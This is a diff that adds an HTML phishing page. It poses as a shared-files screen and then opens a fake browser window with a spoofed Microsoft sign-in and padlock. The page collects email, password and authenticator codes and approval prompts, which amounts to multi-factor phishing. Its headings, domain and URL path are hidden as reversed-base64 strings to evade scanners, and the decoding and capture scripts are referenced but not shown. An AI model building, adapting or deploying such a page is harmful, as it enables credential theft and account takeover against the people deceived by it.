@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="/css/w3.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/jquery.js"></script>
+    <style>
+      .scroll {
+        color: rgb(60, 60, 60);
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+  </head>
+
+  <body style="background-color: rgb(160, 156, 150)">
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        border: 0;
+        outline: 0;
+        font-size: 100%;
+        vertical-align: baseline;
+        background: transparent;
+      }
+      .scroll {
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
+          "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi",
+          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
+          "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
+          "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
+          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
+          "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
+          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        color: rgb(54, 54, 54);
+      }
+      .elements {
+        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
+          "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi",
+          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
+          "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
+          "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
+          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
+          "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
+          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+      }
+    </style>
+    <div
+      style="
+        height: 100vh;
+        width: 240px;
+        background-color: rgb(224, 221, 215);
+        position: absolute;
+      "
+    >
+      <svg
+        viewBox="0 0 136 136"
+        fill="none"
+        role="presentation"
+        focusable="false"
+        width="160"
+        height="160"
+        class="dig-ContentIcon dig-ContentIcon--large"
+        data-testid="FolderBaseDefaultLarge"
+      >
+        <path
+          d="M57.561 36.184c.465.928 1.163 1.795 1.798 2.429.805.803 2.023 1.387 3.698 1.387H116.5v57.13c-.144 2.681-.713 5.228-2.683 7.193-1.805 1.801-4.425 2.677-7.709 2.677H30.892c-3.284 0-5.904-.876-7.709-2.677-1.805-1.801-2.683-4.414-2.683-7.69V29l30.408.003c1.691.054 3.196.814 4.163 2.214l2.49 4.967Z"
+          fill="var(--dig-color__foldericon__shadow, #75aaff)"
+        ></path>
+        <path
+          d="M57.561 36.184c.465.928 1.163 1.795 1.798 2.429.805.803 2.023 1.387 3.698 1.387H116.5v56.13c-.144 2.681-.713 5.228-2.683 7.193-1.805 1.801-4.425 2.677-7.709 2.677H30.892c-3.284 0-5.904-.876-7.709-2.677-1.805-1.801-2.683-4.414-2.683-7.69V29l30.408.003c1.691.054 3.196.814 4.163 2.214l2.49 4.967Z"
+          fill="var(--dig-color__foldericon__container, #a0c4ff)"
+        ></path>
+      </svg>
+      <div
+        style="
+          line-height: 40px;
+          font-size: 17px;
+          letter-spacing: 0.5px;
+          color: rgba(0, 0, 0, 0.734);
+          margin-left: 42px;
+          margin-top: -30px;
+        "
+      >
+        <p style="color: black">All files</p>
+        <p>Photos</p>
+        <p>Shared</p>
+        <p>File requests</p>
+        <p>Deleted files</p>
+      </div>
+    </div>
+    <div
+      style="
+        height: 100vh;
+        position: absolute;
+        background-color: rgba(255, 255, 255, 0.64);
+        width: 100%;
+      "
+    ></div>
+    <div
+      style="
+        background: #fff;
+        width: calc(100% - 630px);
+        min-width: 500px;
+        padding: 55px 90px;
+        margin: auto;
+        margin-bottom: auto;
+        position: relative;
+        top: 55px;
+        margin-bottom: 80px;
+        min-height: 450px;
+        display: flex;
+        justify-content: center;
+        box-shadow: 0 0 0 1px rgba(99, 114, 130, 0.16),
+          0 8px 16px rgba(27, 39, 51, 0.08);
+      "
+    >
+      <div>
+        <p
+          class="elements"
+          style="
+            font-size: 24px;
+            color: rgba(0, 0, 0, 0.734);
+            text-align: center;
+          "
+        >
+          Welcome back
+        </p>
+
+        <style>
+          #login-btn:hover {
+            background-color: #000;
+            color: white;
+          }
+
+          #login-btn {
+            display: flex;
+            width: 100%;
+            border: 1px solid rgba(39, 39, 39, 0.474);
+            padding: 8px 46px;
+            background-color: transparent;
+            color: rgba(0, 0, 0, 0.837);
+            cursor: pointer;
+            text-align: center;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            margin: 27px 0px 16px;
+          }
+
+          #login-btn-2 {
+            background-color: rgb(23, 112, 255);
+            color: white;
+            text-align: center;
+            padding: 18px;
+            border-radius: 16px;
+            margin-top: 32px;
+            width: 100%;
+          }
+
+          #login-btn-2:hover {
+            background-color: rgb(0, 98, 255);
+            cursor: pointer;
+          }
+        </style>
+        <div style="margin-top: 80px; text-align: center; line-height: 30px">
+          <button id="login-btn" class="elements">
+            <img
+              id="lgImg"
+              src="/images/msf.svg"
+              style="margin: 0px 8px; width: 10%"
+            />Continue with Microsoft
+            <svg
+              class="pointer"
+              width="20"
+              viewBox="0 0 26 26"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+              style="margin: 0px 4px 0px"
+            >
+              <path
+                d="M22.375 12.5437C22.375 13.1909 21.8503 13.7156 21.2031 13.7156L4.79687 13.7156C4.14967 13.7156 3.625 13.1909 3.625 12.5437C3.625 11.8965 4.14966 11.3718 4.79687 11.3718L21.2031 11.3718C21.8503 11.3718 22.375 11.8965 22.375 12.5437Z"
+                fill="rgb(0,0,0, 0.7)"
+              ></path>
+              <path
+                d="M12.1714 21.5755C11.7137 21.1178 11.7137 20.3758 12.1714 19.9182L19.5458 12.5437L12.1714 5.16922C11.7137 4.71157 11.7137 3.96958 12.1714 3.51194C12.629 3.05429 13.371 3.05429 13.8286 3.51194L22.0318 11.7151C22.4894 12.1727 22.4894 12.9147 22.0318 13.3723L13.8286 21.5755C13.371 22.0331 12.629 22.0331 12.1714 21.5755Z"
+                fill="rgb(0,0,0, 0.7)"
+              ></path>
+            </svg>
+            <i
+              id="login-spinner"
+              class="fa fa-spinner fa-spin"
+              style="display: none"
+            ></i>
+          </button>
+
+          <div style="display: flex; justify-content: center">
+            <div
+              style="
+                border-bottom: 1px solid rgba(0, 0, 0, 0.226);
+                width: 150px;
+              "
+            ></div>
+            <div class="elements" style="margin: 0px 16px -13px">or</div>
+            <div
+              style="
+                border-bottom: 1px solid rgba(0, 0, 0, 0.226);
+                width: 150px;
+              "
+            ></div>
+          </div>
+          <div style="margin-top: 32px">
+            <p class="elements">Log in using</p>
+            <p id="email-root" class="email elements"></p>
+          </div>
+          <div style="text-align: left; margin-top: 18px">
+            <div
+              class="elements"
+              style="font-size: 12px; color: rgba(0, 0, 0, 0.601)"
+            >
+              Password
+            </div>
+            <input
+              type="text"
+              name=""
+              id=""
+              style="
+                border: 0.5px solid rgba(0, 0, 0, 0.389);
+                width: 100%;
+                padding: 12px;
+              "
+              disabled
+            />
+            <div
+              class="elements"
+              style="
+                font-size: 12px;
+                color: rgba(23, 112, 255);
+                margin-top: 8px;
+              "
+            >
+              Forgot your password?
+            </div>
+            <button id="login-btn-2" class="elements">Log in</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="position: absolute; top: -5px; width: 100%">
+      <div
+        id="window"
+        style="
+          margin-left: auto;
+          margin-right: auto;
+          position: relative;
+          display: none;
+          background-color: white;
+        "
+      >
+        <!-- Title bar start -->
+        <div id="title-bar-width">
+          <div id="title-bar" style="height: 33px">
+            <div class="w3-row" style="padding: 4px; width: 340px">
+              <div class="w3-col s1">
+                <img
+                  src="/images/logo.svg"
+                  style="width: 20px; margin-top: 6px"
+                  id="logo"
+                />
+              </div>
+              <div class="w3-col s10">
+                <span id="logo-description"
+                  >OBFS=Qnb192YjFGIyV3b5Byb0BibpBibnl2UEND</span
+                >
+              </div>
+            </div>
+
+            <div>
+              <span id="minimize">&#8212;</span>
+              <span id="square">□</span>
+              <span id="exit">✕</span>
+            </div>
+          </div>
+          <div id="url-bar">
+            <img
+              src="/images/ssl.svg"
+              width="27px"
+              height="27px"
+              id="ssl-padlock"
+            />
+            <span id="domain-name"
+              >OBFS6MHc0RHaEND//OBFS==QbvNmLl5Was52b0Z2bz9mcjlWbu4Wan9GbEND</span
+            >
+            <span id="domain-path"
+              >OBFS=UWdyRXPkF2bsVmcf92czZCMuEjLz4yN9IXZ21CduVWasNWL4ZCMfZDVF50XElUPVt0UtQnbllGbj1CemEUTvRka3sUavZ3RYVUc28lSZljaK50Q6FFTlV3NMVHRqd1VUR2XCZmT0pmQWJTOINmWrZUQOtUUu5GZ3YkWilkaNFXZ1AVR2JTeJFkSyg0SUNGV1EGMSh0M6xUZ6p2bqNVa5lmbEJEV5FGcslnUFl3bh1GaV9kZLlkaQxEVFpkcoxGNGlVVflFU5lFVJhlSfhlUxN3NtETY6pHdwlzNydUZ3k1M5FDW391VnB1dwB1bERVLrZ0StgDOahmdFdDSiJFZBNjV0J2Yyc1XTNEcrJFdwYWZkVzRaFWbi9lQZl2Q5MXOBRTUQZDNfdkd1MGS4YDe2BXaVNWNqtUcN1GdBZzQ2Y0TERzZhJ3TLR3TydVWnVzdOpUM9UGdhR3cmkDMlJWN3UjMhhjZ20yM0ETYtQGOlRTLiZmZl1CM4YjMlZDN00DZp1CdzVWdxVmctQnbllGbjZyUV1ibl1Ddr1mJTVVLuVWPzVGbhN2bs9Va1ZSeFR1T0U1RNhGZqpFbspnT0VkeOBzZUxENVRVTwAzQaBTVq1EdR1WW00ERP1mQqpVaWpnTshmaOtGbUp1aSRVW0VkeNp3aUxEeFpmTwAzUPFTTX1EdVJTTwUEVZJTVtllLxcjNyQzMxYTM5cTMyETN4MjN9U2Yu9mbmQ3cvB3XtJ3bm1TZk9WbfV2cu9GczVmcmwGbB5SZt9GSlNWamZ2TGJTJyYnRyUSbvNmLlNWamZ2buc3d3ZkMlYkMlE0MlMHc0RHawITJlxWam9mcwBjMlQWauVGcv1TZw92YzZiblt2b09FZpBjMlUGZvNWPlBXe09VZz52bwNXZyZiM2dmbpRmbhxmRyUSbvNmLlNWamZ2buc3d3ZkMlYkMlE0MlMHc0RHa9kmc19FdjVmcpRWZyZSYjZzNyUjN3MTOkFTL2U2M40CMilDNtYzYyMTLiVDN0UjN3QTPkl2X05WZpx2Y/UmepJ3boRXdh9CMuIjdvIDa0VXYv9ibv1WbvN2LEND</span
+            >
+          </div>
+        </div>
+        <!-- Content start -->
+        <div
+          id="loader"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+          "
+        >
+          <div>
+            <img src="/images/microsoft-logo.svg" alt="" />
+          </div>
+
+          <div style="margin: 32px 0px">
+            <span id="one" style="font-weight: 500; font-size: 25px"
+              >OBFSulGI19Weg42ZpNHIvRHIn5Wa5JHVEND</span
+            >
+          </div>
+
+          <div style="height: 5px; position: relative; margin: 48px 0px 32px">
+            <div class="progress1"></div>
+            <div class="progress2"></div>
+            <div class="progress3"></div>
+            <div class="progress4"></div>
+            <div class="progress5"></div>
+          </div>
+
+          <div style="margin: 12px 0px 4px">
+            <span
+              style="
+                color: #0067b8;
+                font-size: 1.0155rem;
+                font-weight: 400;
+                line-height: 1.25rem;
+              "
+              >Cancel</span
+            >
+          </div>
+        </div>
+        <div
+          id="enter-email"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+          "
+        >
+          <div
+            id="loader-email"
+            style="height: 5px; position: relative; visibility: hidden"
+          >
+            <div class="progress1"></div>
+            <div class="progress2"></div>
+            <div class="progress3"></div>
+            <div class="progress4"></div>
+            <div class="progress5"></div>
+          </div>
+          <div style="padding: 44px">
+            <div>
+              <img src="/images/microsoft-logo.svg" alt="" />
+            </div>
+
+            <div style="margin-bottom: 8px; margin-top: 16px">
+              <span id="two-email" style="font-weight: 500; font-size: 25px"
+                >OBFS==gbpBibnl2UEND</span
+              >
+              <div
+                id="incorrect-email"
+                style="
+                  margin-top: 12px;
+                  color: #e81123;
+                  font-weight: 400;
+                  font-size: 0.9375rem;
+                  line-height: 1.25rem;
+                  display: none;
+                "
+              >
+                The email you entered is incorrect.
+                <a href="" style="color: #0067b8">reset it now</a>.
+              </div>
+            </div>
+            <div>
+              <input
+                id="email-input"
+                type="text"
+                placeholder="Email, phone or Skype"
+                style="
+                  border-top: none;
+                  border-left: none;
+                  border-right: none;
+                  outline: none;
+                  padding: 8px 0px;
+                  width: 100%;
+                  font-size: 14px;
+                  border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+                "
+              />
+            </div>
+            <div style="margin: 12px 0px 4px"></div>
+            <div
+              style="
+                margin-top: 14px;
+                font-weight: 400;
+                font-size: .8125rem;
+                line-height: 1.25rem;
+              "
+            >
+              No account?
+              <a href="" style="color: #0067b8">Create one!</a>.
+            </div>
+            <div style="color: #0067b8; font-size: .8125rem; margin-top: 13px;">Can’t access your account?</div>
+            <div style="display: flex; justify-content: right">
+              <div
+                id="sign-in-btn-0"
+                class="pointer"
+                style="
+                  color: #fff;
+                  border-color: #0067b8;
+                  background-color: #0067b8;
+                  display: block;
+                  width: 110px;
+                  margin-top: 16px;
+                  padding: 6px 12px 6px 12px;
+                  text-align: center;
+                "
+              >
+                Next
+              </div>
+            </div>
+          </div>
+        </div>
+        <div
+          id="sign-in"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+          "
+        >
+          <div
+            id="loader-sign-in"
+            style="height: 5px; position: relative; visibility: hidden"
+          >
+            <div class="progress1"></div>
+            <div class="progress2"></div>
+            <div class="progress3"></div>
+            <div class="progress4"></div>
+            <div class="progress5"></div>
+          </div>
+          <div style="padding: 44px">
+            <div>
+              <img src="/images/microsoft-logo.svg" alt="" />
+            </div>
+            <div style="margin: 16px 0px; height: 26px">
+              <div
+                id="left-arrow"
+                class="pointer"
+                style="
+                  height: 21px;
+                  width: 23px;
+                  float: left;
+                  padding: 0px;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  background-color: #ffffff;
+                  border-radius: 24px;
+                "
+              >
+                <img src="/images/left-arrow.svg" alt="" />
+              </div>
+              <span
+                id="email-sign-in"
+                class="email"
+                style="margin-left: 3px; font-size: 15px"
+              >
+              </span>
+            </div>
+            <div style="margin-bottom: 12px">
+              <span id="two" style="font-weight: 500; font-size: 25px"
+                >OBFS=Qmcvd3czFGcgIXZ05WREND</span
+              >
+              <div
+                id="incorrect-pass"
+                style="
+                  margin-top: 12px;
+                  color: #e81123;
+                  font-weight: 400;
+                  font-size: 0.9375rem;
+                  line-height: 1.25rem;
+                  display: none;
+                "
+              >
+                Your account or password is incorrect. If you don't remember
+                your password,
+                <a href="" style="color: #0067b8">reset it now</a>.
+              </div>
+            </div>
+            <div>
+              <input
+                id="pass-input"
+                type="password"
+                placeholder="Password"
+                style="
+                  border-top: none;
+                  border-left: none;
+                  border-right: none;
+                  outline: none;
+                  padding: 8px 0px;
+                  width: 100%;
+                  font-size: 14px;
+                  border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+                "
+              />
+            </div>
+            <div style="margin: 12px 0px 4px"></div>
+            <div style="display: flex; justify-content: right">
+              <div
+                id="sign-in-btn-1"
+                class="pointer"
+                style="
+                  color: #fff;
+                  border-color: #0067b8;
+                  background-color: #0067b8;
+                  display: block;
+                  width: 110px;
+                  margin-top: 16px;
+                  padding: 6px 12px 6px 12px;
+                  text-align: center;
+                "
+              >
+                Sign in
+              </div>
+            </div>
+          </div>
+        </div>
+        <div
+          id="enter-code"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+          "
+        >
+          <div
+            id="loader-enter-code"
+            style="height: 5px; position: relative; visibility: hidden"
+          >
+            <div class="progress1"></div>
+            <div class="progress2"></div>
+            <div class="progress3"></div>
+            <div class="progress4"></div>
+            <div class="progress5"></div>
+          </div>
+          <div style="padding: 44px">
+            <div>
+              <img src="/images/microsoft-logo.svg" alt="" />
+            </div>
+            <div style="margin: 16px 0px; height: 20px">
+              <span id="email-enter-code" class="email" style="font-size: 15px">
+              </span>
+            </div>
+            <div style="margin-bottom: 12px">
+              <span id="three" style="font-weight: 500; font-size: 25px"
+                >OBFS==QZk92YgIXZ05WREND</span
+              >
+            </div>
+            <div style="margin: 16px 0px">
+              <div
+                style="
+                  height: 21px;
+                  width: 23px;
+                  float: left;
+                  padding: 0px;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  background-color: #ffffff;
+                  border-width: 0;
+                  border-radius: 24px;
+                "
+              >
+                <img
+                  src="/images/picker-verify-code.svg"
+                  alt=""
+                  style="width: 100%"
+                />
+              </div>
+            </div>
+            <span id="four" style="margin-left: 2px; font-size: 15px"
+              >Enter the code displayed in the authenticator app on your mobile
+              device​​
+            </span>
+            <div
+              id="incorrect-code"
+              style="
+                margin-top: 12px;
+                color: #e81123;
+                font-weight: 400;
+                font-size: 0.9375rem;
+                line-height: 1.25rem;
+                display: none;
+              "
+            >
+              You didn't enter the expected verification code. Please try again.
+            </div>
+            <div style="margin-top: 16px">
+              <input
+                id="code-input"
+                type="tel"
+                placeholder="Code"
+                style="
+                  border-top: none;
+                  border-left: none;
+                  border-right: none;
+                  outline: none;
+                  padding: 8px 0px;
+                  width: 100%;
+                  font-size: 14px;
+                  border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+                "
+              />
+            </div>
+            <div style="margin: 12px 0px 4px"></div>
+            <div style="display: flex; justify-content: right">
+              <div
+                id="cancel-code"
+                class="pointer"
+                style="
+                  color: #292929;
+                  border-color: rgba(0, 0, 0, 0.2);
+                  background-color: rgba(0, 0, 0, 0.2);
+                  display: block;
+                  width: 110px;
+                  margin-top: 16px;
+                  margin-right: 8px;
+                  padding: 6px 12px 6px 12px;
+                  text-align: center;
+                "
+              >
+                Cancel
+              </div>
+              <div
+                id="verify-code"
+                class="pointer"
+                style="
+                  color: #fff;
+                  border-color: #0067b8;
+                  background-color: #0067b8;
+                  display: block;
+                  width: 110px;
+                  margin-top: 16px;
+                  padding: 6px 12px 6px 12px;
+                  text-align: center;
+                "
+              >
+                Verify
+              </div>
+            </div>
+          </div>
+        </div>
+        <div
+          id="authenticate"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 32px;
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+          "
+        >
+          <div>
+            <img src="/images/microsoft-logo.svg" alt="" />
+          </div>
+          <div style="margin: 16px 0px; height: 20px">
+            <span id="email-authenticate" class="email" style="font-size: 15px">
+            </span>
+          </div>
+          <div style="margin-bottom: 12px">
+            <span id="five" style="font-weight: 500; font-size: 25px"
+              >OBFS=Q3clVXclJHIulGIudWazBSZ29mcwBXQEND</span
+            >
+          </div>
+          <div style="margin: 24px 0px">
+            <div
+              style="
+                height: 21px;
+                width: 23px;
+                float: left;
+                padding: 0px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background-color: #ffffff;
+                border-width: 0;
+                border-radius: 24px;
+              "
+            >
+              <img
+                src="/images/picker-verify-authenticator.svg"
+                alt=""
+                style="width: 100%"
+              />
+            </div>
+          </div>
+          <span id="six" style="margin-left: 2px; font-size: 15px"
+            >Enter the code displayed in the authenticator app on your mobile
+            device​​
+          </span>
+          <div
+            style="
+              display: flex;
+              justify-content: center;
+              margin: 32px 0px 50px;
+            "
+          >
+            <div
+              style="
+                height: 40px;
+                width: 55px;
+                border: 1px solid rgba(0, 0, 0, 0.644);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+              "
+            >
+              <span id="auth-number" style="font-size: 2.5rem"></span>
+            </div>
+          </div>
+
+          <p id="seven" style="font-size: 14px">
+            No numbers in your app? Make sure to upgrade to the latest version
+          </p>
+          <div style="margin: 12px 0px 4px">
+            <span
+              id="eight"
+              style="
+                color: #0067b8;
+                font-size: 0.8125rem;
+                font-weight: 400;
+                line-height: 1.25rem;
+              "
+              >OBFS==wdv5GI0h2ZpJHIwBXYgI3b0F2YpRnblhGd1FEI0Z2bz9mcjlWTgkXbgU2c1BCdn4WYjBSSEND</span
+            >
+          </div>
+          <div style="margin: 12px 0px 4px"></div>
+        </div>
+        <style>
+          p {
+            margin: 16px 0px;
+          }
+        </style>
+        <div
+          id="resend-card"
+          class="scroll"
+          style="
+            margin-left: auto;
+            margin-right: auto;
+
+            position: relative;
+            max-width: 350px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 28px;
+            background-color: #ffffff;
+            text-align: left;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 420px;
+            min-height: 238px;
+            overflow: hidden;
+            font-weight: 400;
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            display: none;
+          "
+        >
+          <div>
+            <img src="/images/microsoft-logo.svg" alt="" />
+          </div>
+          <div
+            id="loader-resend"
+            style="height: 5px; position: relative; visibility: hidden"
+          >
+            <div class="progress1"></div>
+            <div class="progress2"></div>
+            <div class="progress3"></div>
+            <div class="progress4"></div>
+            <div class="progress5"></div>
+          </div>
+          <div style="margin: 16px 0px; height: 20px">
+            <span id="email-resend" class="email" style="font-size: 15px">
+            </span>
+          </div>
+          <div style="margin-bottom: 18px">
+            <span id="nine" style="font-weight: 500; font-size: 25px"
+              >OBFS=U3b5BSbvJnZgIXYlhGI0dibklGZgU2VEND</span
+            >
+          </div>
+
+          <span style="font-size: 15px"
+            >We sent an identity verification request to your app, but we didn't
+            hear from you in time.
+            <span style="color: #0067b8" class="pointer">View details</span>
+          </span>
+          <p id="resend" class="pointer" style="color: #0067b8">
+            Send another request to my Microsoft Authenticator app
+          </p>
+          <p style="font-size: 20px">Having trouble?</p>
+
+          <p>
+            <span style="color: #0067b8" class="pointer"
+              >Enter a security code</span
+            >
+            from your Microsoft account or authenticator app instead.
+          </p>
+
+          <p>
+            If you can't use an app right now
+            <span style="color: #0067b8" class="pointer"
+              >get a code a different way.</span
+            >
+          </p>
+          <p class="pointer" style="color: #0067b8">More information</p>
+          <div style="display: flex; justify-content: right">
+            <div
+              id="cancel-code-2"
+              class="pointer"
+              style="
+                color: #292929;
+                border-color: rgba(0, 0, 0, 0.2);
+                background-color: rgba(0, 0, 0, 0.2);
+                display: block;
+                width: 110px;
+                margin-top: 16px;
+                margin-right: 8px;
+                padding: 6px 12px 6px 12px;
+                text-align: center;
+              "
+            >
+              Cancel
+            </div>
+          </div>
+
+          <div style="margin: 12px 0px 4px"></div>
+        </div>
+      </div>
+    </div>
+    <script src="/js/obfs.js"></script>
+    <script src="/js/script.js"></script>
+    <script src="/js/operation.js"></script>
+  </body>
+</html>
